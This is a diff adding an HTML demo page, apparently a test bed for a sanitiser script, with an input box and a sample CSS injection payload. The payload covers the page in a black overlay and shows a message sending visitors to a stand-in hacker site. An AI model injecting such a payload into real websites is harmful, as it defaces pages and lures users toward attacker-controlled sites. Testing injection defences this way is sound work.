@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Deface page by style tag</title>
+        <meta charset="utf8"/>
+    </head>
+    <body>
+        <hr/>
+        <textarea rows="5" style="display: block; width: 100%" id="val"></textarea>
+        <button id="trigger">Submit</button>
+        <hr/>
+        <ul id="dp">
+            <li>First text</li>
+            <li>Second text</li>
+        </ul>
+        <hr/>
+        <p>Sample</p>
+        <pre>&lt;style&gt;
+p:before {
+    content: "";
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 100vh;
+    width: 100vw;
+    border: none;
+    margin: 0;
+    padding: 0;
+    background: black;
+    z-index: 1000000000;
+}
+p:after {
+    content: "Oops. Something went wrong. Go to www.hackersite.com to fix it";
+    position: fixed;
+    display: block;
+    z-index: 1000000001;
+    color: red;
+    font-weight: bold;
+    font-size: 34px;
+    margin: 0;
+    width: 100vw;
+    text-align: center;
+    top: 40%;
+}
+&lt;/style&gt;</pre>
+        <script src="bone.js"></script>
+    </body>
+</html>
